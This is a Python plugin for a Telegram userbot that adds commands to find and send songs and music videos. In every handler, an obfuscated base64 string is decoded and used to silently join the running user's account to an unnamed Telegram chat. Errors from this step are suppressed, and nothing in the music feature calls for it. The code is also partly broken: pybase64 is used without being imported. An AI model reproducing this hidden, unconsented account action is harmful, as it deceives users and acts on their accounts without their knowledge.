"""
credits to @mrconfused and @sandy1709
"""
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
import requests
from bs4 import BeautifulSoup
from telethon import events
import subprocess
from telethon.errors import MessageEmptyError, MessageTooLongError, MessageNotModifiedError
import io
import asyncio
from userbot.utils import admin_cmd
import glob
import os  
from userbot import CMD_HELP, ALIVE_NAME
from userbot.plugins import wolfmusic , wolfmusicvideo
from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from telethon.tl.types import DocumentAttributeVideo
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "@Wolf_User_Bot"

@borg.on(admin_cmd(pattern="song(?: |$)(.*)"))
async def _(event):
    reply_to_id = event.message.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
        await event.edit("wi8..! I am finding your song....")
    elif reply.message:
        query = reply.message
        await event.edit("wi8..! I am finding your song....")
    else:
    	await event.edit("`What I am Supposed to find `")
    	return
    try:
        wolf = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        wolf = Get(wolf)
        await event.client(wolf)
    except:
        pass
    await wolfmusic(str(query),"128k")
    l = glob.glob("*.mp3")
    if l:
        await event.edit("yeah..! i found something wi8..🥰")
    else:
        await event.edit(f"Sorry..! i can't find anything with `{query}`")
    loa = l[0]    
    await borg.send_file(
                event.chat_id,
                loa,
                force_document=True,
                allow_cache=False,
                caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
                reply_to=reply_to_id
            )
    await event.delete()
    os.system("rm -rf *.mp3")
    subprocess.check_output("rm -rf *.mp3",shell=True)
    
@borg.on(admin_cmd(pattern="song320(?: |$)(.*)"))
async def _(event):
    reply_to_id = event.message.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
        await event.edit("wi8..! I am finding your song....")
    elif reply.message:
        query = reply.message
        await event.edit("wi8..! I am finding your song....")
    else:
    	await event.edit("`What I am Supposed to find `")
    	return
    try:
        wolf = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        wolf = Get(wolf)
        await event.client(wolf)
    except:
        pass
    await wolfmusic(str(query),"320k")
    l = glob.glob("*.mp3")
    if l:
        await event.edit("yeah..! i found something wi8..🥰")
    else:
        await event.edit(f"Sorry..! i can't find anything with `{query}`")
    loa = l[0]    
    await borg.send_file(
                event.chat_id,
                loa,
                force_document=True,
                allow_cache=False,
                caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
                reply_to=reply_to_id
            )
    await event.delete()
    os.system("rm -rf *.mp3")
    subprocess.check_output("rm -rf *.mp3",shell=True)    
    
@borg.on(admin_cmd(pattern="vsong(?: |$)(.*)"))
async def _(event):
    reply_to_id = event.message.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
        await event.edit("wi8..! I am finding your videosong....")
    elif reply.message:
        query = reply.message
        await event.edit("wi8..! I am finding your videosong....")
    else:
        await event.edit("What I am Supposed to find")
        return
    await wolfmusicvideo(query)
    try:
        wolf = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        wolf = Get(wolf)
        await event.client(wolf)
    except:
        pass
    l = glob.glob(("*.mp4")) + glob.glob(("*.mkv")) + glob.glob(("*.webm")) 
    if l:
        await event.edit("yeah..! i found something wi8..🥰")
    else:
        await event.edit(f"Sorry..! i can't find anything with `{query}`")
    loa = l[0]  
    metadata = extractMetadata(createParser(loa))
    duration = 0
    width = 0
    height = 0
    if metadata.has("duration"):
        duration = metadata.get("duration").seconds
    if metadata.has("width"):
        width = metadata.get("width")
    if metadata.has("height"):
        height = metadata.get("height")
    await borg.send_file(
                event.chat_id,
                loa,
                force_document=True,
                allow_cache=False,
                caption=f"`Song`: {query}\n`Uploaded by`: {DEFAULTUSER}",
                supports_streaming=True,
                reply_to=reply_to_id,
                attributes=[DocumentAttributeVideo(
                                duration=duration,
                                w=width,
                                h=height,
                                round_message=False,
                                supports_streaming=True,
                            )],
            )
    await event.delete()
    os.system("rm -rf *.mkv")
    os.system("rm -rf *.mp4")
    os.system("rm -rf *.webm")    
    
    
CMD_HELP.update({"getmusic":
    "`.song` query or `.song` reply to song name :\
    \nUSAGE:finds the song you entered in query and sends it"
})
